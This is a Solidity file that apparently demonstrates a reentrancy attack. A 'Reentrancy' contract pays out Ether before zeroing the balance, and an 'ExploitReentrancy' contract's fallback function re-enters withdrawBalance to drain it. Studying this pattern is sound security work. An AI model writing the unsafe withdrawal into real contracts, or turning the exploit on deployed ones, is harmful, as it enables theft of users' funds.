pragma solidity ^0.4.17;

contract Reentrancy {
    mapping (address => uint) userBalance;
    event EnteredAddToBalanceFunction(address ad, uint val);
    event LeavingWithdrawFunction(address ad, uint bal, bool result);
    event CurrContractBal(uint bal);
    event CurrAccBal(uint bal);

    function thisBalance() public view returns (uint) {
        return this.balance;
    }

    function getBalance(address u) constant public returns (uint ){
        return userBalance[u];
    }

    function addToBalance(address add) public payable {
        EnteredAddToBalanceFunction(add, msg.value);
        userBalance[add] += msg.value;
    }

    function withdrawBalance(address add) public {
        CurrContractBal(this.balance);
        bool success = add.call.value(userBalance[add])();
        userBalance[add] = 0;
        CurrAccBal(userBalance[add]);
        LeavingWithdrawFunction(add, userBalance[add], success);
    }
}

contract ExploitReentrancy {
    Reentrancy r;
    address account;
    event EnteredPayable(address ad, uint bal);

    function ExploitReentrancy(address reentrant) public {
        r = Reentrancy(reentrant);
    }

    function initAccountAddress(address acc) public {
        account = acc;
    }

    function tryDeposit() public payable {
        r.addToBalance.value(msg.value)(account);
    }

    function tryWithdraw() public {
        r.withdrawBalance(account);
    }

    function thisBalance() public view returns (uint) {
        return this.balance;
    }

    function () public payable {
        EnteredPayable(account, msg.value);
        r.withdrawBalance(account);
    }
}
